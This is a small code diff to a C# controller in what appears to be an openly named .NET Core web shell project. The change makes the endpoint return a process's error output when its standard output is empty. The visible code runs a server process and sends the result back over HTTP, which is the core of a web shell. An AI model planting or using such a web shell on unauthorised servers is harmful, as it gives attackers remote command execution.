@@ -48,10 +48,12 @@ namespace web_shell_dotnetcore.Controllers
             error = process.StandardError.ReadToEnd();
             process.WaitForExit();
 
+            result = result == "" ? error : result;
+            
             return new JsonResult(result)
             {
                 StatusCode = 200
-            };
+            };            
         }
 
     }
